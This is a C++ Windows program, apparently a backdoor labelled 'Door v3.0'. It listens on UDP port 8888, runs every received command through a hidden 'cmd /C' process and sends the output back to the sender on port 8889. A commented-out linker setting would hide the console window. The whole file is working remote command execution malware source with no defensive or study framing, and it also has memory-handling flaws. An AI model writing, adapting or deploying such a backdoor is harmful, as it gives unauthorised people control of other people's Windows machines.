#include<stdio.h>
#include<WinSock2.h>
#include<Windows.h>
#include<iostream>
#include<string>
#pragma comment(lib,"ws2_32.lib")
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define MAXGOTORDER 8192
#define MAXREBACKMSG 16384
typedef struct _MSGSEND
{
	char cmd[MAXREBACKMSG];
	SOCKET socket;
	SOCKADDR_IN from;
	int len;
}MSGSEND;



using namespace std;
int execmd(char* cmd, char* result);
DWORD WINAPI SendMsg(LPVOID msg);


void main() {
	//初始化系统，获取相关参数
	char hostip[32], hostname[256];
	WORD wVersionRequested;
	WSADATA wsadata;
	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &wsadata) != 0 || LOBYTE(wsadata.wVersion) != 1 || HIBYTE(wsadata.wVersion) != 1) {
		WSACleanup();
		return;
	}
	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
		cout << "fail to get hostname!!!\n" << endl;
		return;
	}
	else {
		cout << "------------HostName:---------------\n" << hostname << endl;
	}
	HOSTENT* host = gethostbyname(hostname);
	if (host == NULL) {
		cout << "fail to get hostname\n" << endl;
		return;
	}
	else {
		strcpy(hostip, inet_ntoa(*(in_addr*)*host->h_addr_list));
		cout << "---successful get host ip address---\n" << hostip << "\n" << endl;
	}
	char recvBuf[MAXGOTORDER] = "";
	char cmdResult[MAXREBACKMSG] = "";
	SOCKET socketsrv = socket(AF_INET, SOCK_DGRAM, 0);
	int len = sizeof(SOCKADDR);
	SOCKADDR_IN from;
	SOCKADDR_IN local;
	local.sin_addr.S_un.S_addr = inet_addr(hostip);
	local.sin_family = AF_INET;
	local.sin_port = htons(8888);
	int bindErr = bind(socketsrv, (SOCKADDR*)&local, len);
	if (bindErr != 0) {
		//端口绑定失败
		return;
	}
	printf("Door v3.0 open ......\n");
	//创建单次发信模板
	MSGSEND MsgSend;
	MsgSend.socket = socketsrv;
	MsgSend.len = len;
	while (1) {
		memset(recvBuf, 0, sizeof(recvBuf));
		recvfrom(socketsrv, recvBuf, MAXGOTORDER, 0, (SOCKADDR*)&from, &len);//接受客户端信息
																	//添加单次发信数据
		cout << "------------->" <<inet_ntoa(from.sin_addr) << endl;
		MsgSend.from = from;
		strcpy(MsgSend.cmd, recvBuf);
		HANDLE thread = CreateThread(NULL, 0, SendMsg, &MsgSend, 0, NULL);
	}
	closesocket(socketsrv);
	WSACleanup();
}

int execmd(char* cmd, char* result) {
	//ShellExecuteA(NULL,"open","cmd.exe","/c calc","",SW_HIDE);不方便返回执行信息，先采用create_process
	SECURITY_ATTRIBUTES sa;
	HANDLE hRead, hWrite;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead,&hWrite,&sa,0)) {
		cout << "创建回信管道失败！" << endl;
		return 0;
	}
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si,sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//拼接完整cmd命令
	char cmdTemp[MAXREBACKMSG] = "cmd /C ";
	string tmpCmd = cmd;
	string viewNum;
	string realCmd;
	if (cmd[2] == '>') {
		viewNum = tmpCmd.substr(0,1);
		realCmd = tmpCmd.substr(3);
	}else {
		viewNum = tmpCmd.substr(0, 2);
		realCmd = tmpCmd.substr(4);
	}
	cout << "tmpcmd:" << tmpCmd << endl;
	cout << "num:" << viewNum << endl;
	cout << "realcmd:" << realCmd << endl;
	strcat(cmdTemp,realCmd.data());
	cout << "Complete Cmd command:" << cmdTemp<<endl;
	if (!CreateProcess(NULL,cmdTemp,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)) {
		cout << "执行cmd：" << cmd << "命令失败" << endl;
		return 0;
	}else {
		cout << "执行成功" << endl;
	}
	CloseHandle(hWrite);
	char tmpResult[MAXREBACKMSG];
	DWORD BytesRead;
	strcat(result, (viewNum + "->").data());

	while (TRUE) {
		if (ReadFile(hRead, tmpResult, MAXREBACKMSG, &BytesRead, NULL) == NULL) {	
			strcat(result,"\n-------------执行完毕---------------\n");
			break;
		}
		cout << "----------↓-------------------" << endl;
		strcat(result, tmpResult);
		cout << "tmp:" << tmpResult << endl;
		cout << "result:" << result << endl;
		Sleep(100);
	}
	CloseHandle(hRead);
	cout << "管道关闭" << endl;
	return 1;
}


DWORD WINAPI SendMsg(LPVOID msg) {
	MSGSEND* MsgSend = (MSGSEND*)msg;
	char cmdResult[MAXREBACKMSG];
	execmd(MsgSend->cmd, cmdResult);
	MsgSend->from.sin_port = htons(8889);
	sendto(MsgSend->socket, cmdResult, strlen(cmdResult) + 1, 0, (SOCKADDR*)&MsgSend->from, MsgSend->len);
	cout << "回合终了" << endl;
	return 0L;
}




